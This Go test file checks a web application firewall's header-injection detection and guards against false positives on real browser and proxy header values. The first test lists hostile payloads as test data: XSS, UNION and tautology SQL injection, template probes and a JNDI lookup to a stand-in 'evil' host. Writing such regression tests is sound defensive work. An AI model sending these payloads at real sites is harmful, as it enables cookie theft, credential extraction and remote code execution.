package engine

import (
	"net/http"
	"net/http/httptest"
	"testing"

	"wewaf/internal/core"
)

// hdrSinkBlocked sends a request carrying the given header value and reports
// whether either request phase blocks it.
func hdrSinkBlocked(eng *Engine, header, value string) bool {
	req := httptest.NewRequest(http.MethodGet, "/", nil)
	req.Header.Set(header, value)
	tx := core.NewTransaction(nil, req, nil)
	tx.SetMetadata("body", []byte(""))
	return eng.ProcessRequestHeaders(tx) != nil || eng.ProcessRequestBody(tx) != nil
}

// TestHeaderSinkInjectionBlocked is the round-9 regression: injection payloads
// in client-controlled headers that reach app sinks (access logs / admin UIs =
// stored XSS, analytics + IP-logging = SQLi) were invisible because the
// injection signatures run in the body phase, which previously saw only the
// cookie among headers. A curated allowlist of sink-carrying headers is now
// exposed to that rule set. Coverage targets the injection forms that do NOT
// rely on the ';' separator (union/tautology SQLi, XSS, RCE, template
// injection) — the stacked-query rules stay args/body-only by design to avoid
// false-positiving on the cookie header's ';'-delimited format.
func TestHeaderSinkInjectionBlocked(t *testing.T) {
	eng := newFuzzEngine(t)
	cases := []struct{ h, v string }{
		{"User-Agent", "<script>alert(document.cookie)</script>"},
		{"User-Agent", "Mozilla/5.0' UNION SELECT password FROM users--"},
		{"User-Agent", "<img src=x onerror=alert(1)>"},
		{"Referer", "https://x/?q=<script>alert(1)</script>"},
		{"Referer", "1' OR '1'='1"},
		{"X-Forwarded-For", "1 UNION SELECT password FROM users"},
		{"X-Forwarded-For", "x' OR 1=1--"},
		{"X-Real-IP", "${jndi:ldap://evil/a}"},
		{"True-Client-IP", "<svg onload=alert(1)>"},
		{"Forwarded", "for=1' OR '1'='1"},
		{"Via", "1' UNION SELECT NULL,version()--"},
		{"X-Requested-With", "{{7*7}}${7*7}"},
		{"From", "<script>alert(1)</script>@x.com"},
	}
	for _, c := range cases {
		c := c
		t.Run(c.h+":"+c.v, func(t *testing.T) {
			if !hdrSinkBlocked(eng, c.h, c.v) {
				t.Errorf("header-sink injection not blocked: %s: %q", c.h, c.v)
			}
		})
	}
}

// TestHeaderSinkNoFalsePositive guards the change with a corpus of REAL header
// values (browser UA strings, search/referrer URLs, proxy IP chains incl.
// internal IPs and IPv6, CDN Via chains). This change touches every request's
// User-Agent and Referer, so a regression here would block legitimate traffic.
// In particular X-Forwarded-For legitimately carries internal IPs (the proxy
// chain adds them) and UA version tokens like "Chrome/120.0.0.0" embed a
// literal "0.0.0.0" — neither may trip the bare-IP SSRF rule.
func TestHeaderSinkNoFalsePositive(t *testing.T) {
	eng := newFuzzEngine(t)
	cases := []struct{ h, v string }{
		{"User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"},
		{"User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15"},
		{"User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"},
		{"User-Agent", "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36"},
		{"User-Agent", "curl/8.4.0"},
		{"User-Agent", "Googlebot/2.1 (+http://www.google.com/bot.html)"},
		{"User-Agent", "PostmanRuntime/7.36.0"},
		{"User-Agent", "python-requests/2.31.0"},
		{"User-Agent", "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"},
		{"Referer", "https://www.google.com/search?q=how+to+use+sql+select+and+union&hl=en&source=hp"},
		{"Referer", "https://example.com/products?category=tools&sort=price&order=asc&page=2"},
		{"Referer", "https://app.example.com/dashboard#/reports/2024-q1"},
		{"Referer", "https://shop.example.com/item?id=123&ref=email&utm_source=newsletter&utm_medium=cta"},
		{"Referer", "android-app://com.example.app"},
		{"X-Forwarded-For", "203.0.113.7, 198.51.100.23, 10.0.0.1"},
		{"X-Forwarded-For", "2001:db8::1, 2001:db8::2"},
		{"X-Real-IP", "203.0.113.7"},
		{"True-Client-IP", "198.51.100.5"},
		{"CF-Connecting-IP", "203.0.113.9"},
		{"Forwarded", "for=192.0.2.60;proto=http;by=203.0.113.43, for=198.51.100.17"},
		{"Via", "1.1 vegur, 1.1 varnish, 1.1 cloudfront.net (CloudFront)"},
		{"X-Requested-With", "XMLHttpRequest"},
		{"X-Requested-With", "com.android.browser"},
		{"From", "support@example.com"},
	}
	for _, c := range cases {
		c := c
		t.Run(c.h+":"+c.v, func(t *testing.T) {
			if hdrSinkBlocked(eng, c.h, c.v) {
				t.Errorf("legit header value wrongly blocked: %s: %q", c.h, c.v)
			}
		})
	}
}
